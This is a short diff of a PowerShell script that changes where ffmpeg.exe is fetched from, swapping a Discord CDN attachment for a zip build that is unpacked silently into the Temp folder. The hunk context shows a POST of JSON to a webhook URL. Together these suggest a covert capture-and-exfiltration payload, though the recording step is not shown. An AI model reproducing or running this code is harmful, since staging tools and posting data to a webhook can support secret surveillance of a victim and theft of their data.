@@ -23,8 +23,15 @@ Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Bo
 $Path = "$env:Temp\ffmpeg.exe"
 
 If (!(Test-Path $Path)){  
-$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
-iwr -Uri $url -OutFile $Path
+$zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-6.0-essentials_build.zip'
+$tempDir = "$env:temp"
+$zipFilePath = Join-Path $tempDir 'ffmpeg-6.0-essentials_build.zip'
+$extractedDir = Join-Path $tempDir 'ffmpeg-6.0-essentials_build'
+Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
+Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
+Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
+Remove-Item -Path $zipFilePath -Force
+Remove-Item -Path $extractedDir -Recurse -Force
 }
 
 sleep 1
